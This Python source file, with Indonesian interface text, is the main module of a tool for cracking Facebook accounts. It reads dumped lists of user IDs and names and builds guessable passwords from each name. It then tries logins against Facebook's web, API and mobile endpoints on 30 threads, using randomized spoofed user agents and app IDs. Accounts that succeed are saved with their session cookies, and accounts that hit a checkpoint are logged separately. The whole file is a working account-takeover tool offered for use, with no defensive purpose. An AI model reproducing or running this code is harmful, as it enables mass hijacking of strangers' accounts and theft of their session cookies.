import random, re
from concurrent.futures import ThreadPoolExecutor
from Color import bold_putih, bold_merah, bold_cyan, bold_lime, bold_kuning
from Utils import clear, CheckDumpFile, ConvertCookie, GetTime
from Banner import Choose, MenuMethode
from Methode import Website, API, Async, Regular, Validate, Wbloks

try: from Author import list_app
except Exception as e: clear(); exit('{}Tolong Hargai Author, {}Jangan Rubah Botnya!{}\n'.format(bold_putih, bold_merah, bold_putih))

custom_pass = []

def GeneratePassword(name):
    list_pass = []
    full_name = name.strip().lower().replace("'",'').replace('.','').replace(',','').replace('-','')
    if len(full_name) >= 6: list_pass.extend([full_name, full_name.replace(' ','')])
    try:
        nama_kata = [full_name.split()[0]] if len(full_name.split()) == 1 else [full_name.split()[0], full_name.split()[-1]]
        nama_kata = [i for i in nama_kata if len(str(i)) >= 3]
        nama_kata.extend([nama_kata[0]+'123', nama_kata[0]+'1234', nama_kata[0]+'12345', nama_kata[-1]+'123', nama_kata[-1]+'1234', nama_kata[-1]+'12345'])
        for i in nama_kata:
            if i not in list_pass and len(str(i)) >= 6: list_pass.append(i)
    except Exception as e: pass
    list_pass += custom_pass
    return(list_pass)

def CheckHost(a):
    if   a == 1: host = 'b-graph.facebook.com'
    elif a in [2, 3, 4, 5]: host = 'm.facebook.com'
    else: host = 'null'; exit('\n{}Isi Yang Benar!{}\n'.format(bold_merah, bold_putih))
    return(host)

def CustomDomain(opt, default):
    print('\n{}Metode {}{} {}Menggunakan Subdomain Default {}{}{}'.format(bold_putih, bold_cyan, opt, bold_putih, bold_cyan, default, bold_putih))
    print('{}Jika Ingin Mengganti, Masukkan 1 Subdomain Lain. [{}skip=enter{}]'.format(bold_putih, bold_cyan, bold_putih))
    subdo = input('{}Custom Subdomain : {}'.format(bold_putih, bold_cyan)).lower().strip().replace('facebook','').replace('com','').replace('..','')
    subdomain = '{}.facebook.com'.format(subdo) if subdo not in ['', ' ', '  '] else default
    return(subdomain.replace('..','.'))

def InputFile():
    print("{}Ketik {}cek {}Jika Ingin Melihat Daftar File Dump Anda".format(bold_putih, bold_cyan, bold_putih))
    x = input('{}Masukkan Nama File : {}'.format(bold_putih, bold_cyan)).lower()
    print(bold_putih,end='')
    if x =='cek': file = CheckDumpFile(2)
    else: file = x.replace('dump/','')
    try:
        op = open('dump/{}.txt'.format(str(file).split('.')[0]), 'r')
        lp = op.read().splitlines()
        op.close()
        if len(lp) == 0: exit('\n{}Jumlah ID 0!{}\n'.format(bold_merah, bold_putih))
        else: print(''); return(lp)
    except Exception as e: exit('\n{}File Tidak Ditemukan!{}\n'.format(bold_merah, bold_putih))

def RandomBrowser():
    firefox = ' Firefox/{}.0.{}'.format(str(random.randrange(115,123)), str(random.randrange(0,5)))
    edge    = ' Edg/{}.0.{}.{}'.format(str(random.randrange(115,121)), str(random.randrange(2000,2500)), str(random.randrange(10,200)))
    samsung = ' SamsungBrowser/{}.0.{}.{}'.format(str(random.randrange(15,24)), str(random.randrange(0,8)), str(random.randrange(1,100)))
    opera   = ' OPR/{}.{}.{}.{}'.format(str(random.randrange(71,81)), str(random.randrange(0,3)), str(random.randrange(4000,5000)), str(random.randrange(77000,78000)))
    uc      = ' UCBrowser/{}.{}.{}.{}'.format(str(random.randrange(10,14)), str(random.randrange(0,7)), str(random.randrange(0,3)), str(random.randrange(1000,1500)))
    yandex  = ' YaBrowser/{}.{}.{}.{}'.format(str(random.randrange(15,25)), str(random.randrange(0,5)), str(random.randrange(0,5)), str(random.randrange(10,100)))
    return(random.choice(['', firefox, edge, samsung, opera, uc, yandex]))

def GenerateUserAgentAndroid(model):
    os_version   = str(random.randrange(9, 14))
    main_version = str(random.randrange(100, 122))
    full_version = '{}.0.{}.{}'.format(main_version, str(random.randrange(1000, 10000)), str(random.randrange(10, 1000)))
    p1a          = ' Build/{}.{}{}{}.0{}'.format(str(random.choice(['QP1A', 'RP1A', 'SP1A', 'TP1A', 'UP1A'])), str(random.randrange(18, 24)), str(random.randrange(1, 13)), str(random.randrange(1, 29)), str(random.randrange(1, 21)))
    kq1          = ' Build/{}.{}{}{}.001'.format(str(random.choice(['PKQ1', 'RKQ1', 'SKQ1', 'TKQ1', 'UKQ1'])), str(random.randrange(18, 24)), str(random.randrange(1, 13)), str(random.randrange(1, 29)))
    build        = random.choice(['', p1a, kq1])
    user_agent   = 'Mozilla/5.0 (Linux; Android {}; {}{}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{} Mobile Safari/537.36{}'.format(os_version, model, build, full_version, RandomBrowser())
    return({'user_agent':user_agent, 'main_version':main_version, 'full_version':full_version, 'os_version':os_version, 'model':model})

def GenerateUserAgentDalvik(model):
    os_version   = str(random.randrange(8, 14))
    main_version = str(random.randrange(100, 122))
    full_version = '{}.0.{}.{}'.format(main_version, str(random.randrange(1000, 10000)), str(random.randrange(10, 1000)))
    p1a          = ' Build/{}.{}{}{}.0{}'.format(str(random.choice(['QP1A', 'RP1A', 'SP1A', 'TP1A', 'UP1A'])), str(random.randrange(18, 24)), str(random.randrange(1, 13)), str(random.randrange(1, 29)), str(random.randrange(1, 21)))
    kq1          = ' Build/{}.{}{}{}.001'.format(str(random.choice(['PKQ1', 'RKQ1', 'SKQ1', 'TKQ1', 'UKQ1'])), str(random.randrange(18, 24)), str(random.randrange(1, 13)), str(random.randrange(1, 29)))
    build        = random.choice(['', p1a, kq1])
    fb_version   = '{}.0.0.{}.{}'.format(str(random.randrange(412, 418)), str(random.randrange(10, 100)), str(random.randrange(10, 100)))
    device_name  = random.choice(['samsung', 'huawei', 'oppo', 'vivo', 'realme','asus','xiaomi','oneplus','poco'])
    user_agent   = 'Dalvik/2.1.0 (Linux; U; Android %s; %s%s) [FBAN/FB4A;FBAV/%s;FBPN/com.facebook.katana;FBLC/in_ID;FBBV/%s;FBCR/Corporation Tbk;FBMF/%s;FBBD/%s;FBDV/%s;FBSV/%s;FBCA/x86:armeabi-v7a;FBDM/{density=3.0,width=1440,height=2560};FB_FW/1;FBRV/0;]'%(os_version, model, build, fb_version, str(random.randrange(480000000, 480100000)), device_name, device_name, model, os_version)
    return({'user_agent':user_agent, 'main_version':main_version, 'full_version':full_version, 'os_version':os_version, 'model':model})

def GenerateUserAgentWindows():
    os_version   = str(random.choice(['6.1', '6.2', '6.3', '6.4', '10.0']))
    bit_version  = str(random.choice(['Win64; x64', 'Win32; x86']))
    main_version = str(random.randrange(100, 122))
    full_version = '{}.0.{}.{}'.format(main_version, str(random.randrange(1000, 10000)), str(random.randrange(10, 1000)))
    user_agent   = 'Mozilla/5.0 (Windows NT {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(os_version, bit_version, full_version)
    return({'user_agent':user_agent, 'main_version':main_version, 'full_version':full_version, 'os_version':os_version, 'model':'Windows'})

class Crack():

    def __init__(self):
        self.loop, self.ok, self.cp = 0, 0, 0

    def ChooseFile(self):
        self.list_target = InputFile()

    def ChooseMethode(self):
        MenuMethode()
        self.ch1 = Choose()
        if self.ch1 <= 0 or self.ch1 > 5: exit('\n{}Isi Yang Benar!{}\n'.format(bold_merah, bold_putih))
        hst = CheckHost(self.ch1)
        opt = ['API', 'Validate', 'Async', 'Regular', 'AsyncWbloks'][self.ch1 - 1]
        self.host = CustomDomain(opt, hst)

    def AddCustomPassword(self):
        global custom_pass
        print('\n{}Custom Password, Pisahkan Dengan Koma ({},{}) [{}skip=enter{}]'.format(bold_putih, bold_cyan, bold_putih, bold_cyan, bold_putih))
        custom_pase = input('{}Password : {}'.format(bold_putih, bold_cyan)).split(',')
        custom_pass = [str(i).strip() for i in custom_pase if len(str(i)) >= 6 and i not in custom_pass]

    def SetUserAgent(self):
        print('\n{}Gunakan User Agent Default/Custom? [{}skip=default{}]'.format(bold_putih, bold_cyan, bold_putih))
        usgnt = str(input('{}User Agent [d/c] : {}'.format(bold_putih, bold_cyan)).lower())
        self.isUACustom = True if usgnt in ['2', 'c', 'manual', 'custom'] else False
        if self.isUACustom and len(open('tools/manual_device.txt', 'r').read().splitlines()) == 0:
            exit('\n{}Anda {}Belum Mengatur {}User Agent Custom!\n{}Tambahkan Terlebih Dahulu Pada Menu Settings\n'.format(bold_putih, bold_merah, bold_putih, bold_putih))
        if self.isUACustom: self.list_ua = open('tools/manual_device.txt', 'r').read().splitlines()
        else: self.list_ua = open('tools/default_device.txt', 'r').read().splitlines()

    def CreateFileResult(self):
        t = '-'.join([str(i) for i in GetTime()[3:]])
        self.filename_ok = 'result/OK/{}.txt'.format(t)
        self.filename_cp = 'result/CP/{}.txt'.format(t)
        print('\n{}File {}OK {}: {}{}{}'.format(bold_putih, bold_lime, bold_putih, bold_lime, self.filename_ok, bold_putih))
        print('{}File {}CP {}: {}{}{}'.format(bold_putih, bold_kuning, bold_putih, bold_kuning, self.filename_cp, bold_putih))

    def Start(self):
        self.total = len(self.list_target)
        print('\n{}Proses Crack Dimulai...\n'.format(bold_putih))
        with ThreadPoolExecutor(max_workers=30) as TPE:
            if 'www' in str(self.host) or 'web' in str(self.host):
                for i in self.list_target: TPE.submit(self.CrackWeb, i.split('|')[0], GeneratePassword(i.split('|')[-1]))
            elif self.ch1 == 1:
                for i in self.list_target: TPE.submit(self.CrackAPI, i.split('|')[0], GeneratePassword(i.split('|')[-1]))
            elif self.ch1 == 2:
                for i in self.list_target: TPE.submit(self.CrackValidate, i.split('|')[0], GeneratePassword(i.split('|')[-1]))
            elif self.ch1 == 3:
                for i in self.list_target: TPE.submit(self.CrackAsync, i.split('|')[0], GeneratePassword(i.split('|')[-1]))
            elif self.ch1 == 4:
                for i in self.list_target: TPE.submit(self.CrackRegular, i.split('|')[0], GeneratePassword(i.split('|')[-1]))
            elif self.ch1 == 5:
                for i in self.list_target: TPE.submit(self.CrackWbloks, i.split('|')[0], GeneratePassword(i.split('|')[-1]))

    def CrackWeb(self, id, list_pw):
        try:
            for pw in list_pw:
                ua = GenerateUserAgentWindows()
                Request, Response = Website(id, pw, self.host, ua)
                cookie = ConvertCookie(' '.join(['{}={};'.format(x, y) for x, y in Request.cookies.get_dict().items()]))
                if 'c_user' in str(cookie): self.SaveResult('ok', id, pw, cookie); break
                elif 'checkpoint' in str(cookie): self.SaveResult('cp', id, pw, cookie); break
                else: continue
            self.loop += 1
            self.CountProc()
        except Exception as e: self.CrackWeb(id, list_pw)

    def CrackAPI(self, id, list_pw):
        try:
            for pw in list_pw:
                ua = GenerateUserAgentDalvik(random.choice(self.list_ua))
                Request, Response = API(id, pw, self.host, ua)
                if 'session_key' in str(Response) and 'EAA' in str(Response) and 'c_user' in str(Response):
                    try:
                        # token  = re.search(r'"access_token":"(.*?)"',str(Response)).group(1)
                        cookie = 'datr={}; c_user={}; xs={}; fr={}; '.format(re.search(r'"name":"datr","value":"(.*?)"',str(Response)).group(1), re.search(r'"name":"c_user","value":"(.*?)"',str(Response)).group(1), re.search(r'"name":"xs","value":"(.*?)"',str(Response)).group(1), re.search(r'"name":"fr","value":"(.*?)"',str(Response)).group(1))
                        self.SaveResult('ok', id, pw, cookie); break
                    except Exception as e:
                        self.SaveResult('cp', id, pw, ''); break
                elif "User must verify their account on www.facebook.com" in str(Response) or "checkpoint" in str(Response):
                    if 'Login approvals are on' in str(Response): break
                    else: self.SaveResult('cp', id, pw, ''); break
                else: continue
            self.loop += 1
            self.CountProc()
        except Exception as e: self.CrackAPI(id, list_pw)

    def CrackValidate(self, id, list_pw):
        try:
            for pw in list_pw:
                ua = GenerateUserAgentAndroid(random.choice(self.list_ua))
                app_id = random.choice(list_app)
                Request, Response = Validate(id, pw, self.host, ua, app_id)
                cookie = ConvertCookie(' '.join(['{}={};'.format(x, y) for x, y in Request.cookies.get_dict().items()]))
                if 'c_user' in str(cookie): self.SaveResult('ok', id, pw, cookie); break
                elif 'checkpoint' in str(cookie): self.SaveResult('cp', id, pw, cookie); break
                else: continue
            self.loop += 1
            self.CountProc()
        except Exception as e: self.CrackValidate(id, list_pw)

    def CrackAsync(self, id, list_pw):
        try:
            for pw in list_pw:
                ua = GenerateUserAgentAndroid(random.choice(self.list_ua))
                app_id = random.choice(list_app)
                Request, Response = Async(id, pw, self.host, ua, app_id)
                cookie = ConvertCookie(' '.join(['{}={};'.format(x, y) for x, y in Request.cookies.get_dict().items()]))
                if 'c_user' in str(cookie): self.SaveResult('ok', id, pw, cookie); break
                elif 'checkpoint' in str(cookie): self.SaveResult('cp', id, pw, cookie); break
                else: continue
            self.loop += 1
            self.CountProc()
        except Exception as e: self.CrackAsync(id, list_pw)

    def CrackRegular(self, id, list_pw):
        try:
            for pw in list_pw:
                ua = GenerateUserAgentAndroid(random.choice(self.list_ua))
                app_id = random.choice(list_app)
                Request, Response = Regular(id, pw, self.host, ua, app_id)
                cookie = ConvertCookie(' '.join(['{}={};'.format(x, y) for x, y in Request.cookies.get_dict().items()]))
                if 'c_user' in str(cookie): self.SaveResult('ok', id, pw, cookie); break
                elif 'checkpoint' in str(cookie): self.SaveResult('cp', id, pw, cookie); break
                else: continue
            self.loop += 1
            self.CountProc()
        except Exception as e: self.CrackRegular(id, list_pw)
    
    def CrackWbloks(self, id, list_pw):
        try:
            for pw in list_pw:
                ua = GenerateUserAgentAndroid(random.choice(self.list_ua))
                app_id = random.choice(list_app)
                Request, Response = Wbloks(id, pw, self.host, ua, app_id)
                cookie = ConvertCookie(' '.join(['{}={};'.format(x, y) for x, y in Request.cookies.get_dict().items()]))
                if 'c_user' in str(cookie): self.SaveResult('ok', id, pw, cookie); break
                elif 'checkpoint' in str(cookie): self.SaveResult('cp', id, pw, cookie); break
                else: continue
            self.loop += 1
            self.CountProc()
        except Exception as e: self.CrackWbloks(id, list_pw)

    def SaveResult(self, stat, id, pw, cookie):
        if stat == 'ok':
            fmt = '{}{}|{}|{}{}'.format(bold_lime, id, pw, cookie, bold_putih)
            if fmt not in open(self.filename_ok, 'r').read().splitlines():
                open(self.filename_ok, 'a+').write('{}|{}|{}\n'.format(id, pw, cookie))
                print('\r{}{}'.format(fmt, ' '*(63-len(str(fmt)))))
                self.ok += 1
        elif stat == 'cp':
            fmt = '{}{}|{}{}'.format(bold_kuning, id, pw, bold_putih)
            if fmt not in open(self.filename_cp, 'r').read().splitlines():
                open(self.filename_cp, 'a+').write('{}|{}|{}\n'.format(id, pw, 'null'))
                print('\r{}{}'.format(fmt, ' '*(63-len(str(fmt)))))
                self.cp += 1
        else: pass

    def CountProc(self):
        display = '{}[{}{}{}/{}{}{}] {}[{}OK:{}{}] {}[{}CP:{}{}]'.format(bold_putih, bold_cyan, str(self.loop), bold_putih, bold_cyan, str(self.total), bold_putih, bold_putih, bold_lime, str(self.ok), bold_putih, bold_putih, bold_kuning, str(self.cp), bold_putih)
        print('\r{}{}'.format(display, ' '*(23)), end='', flush=True)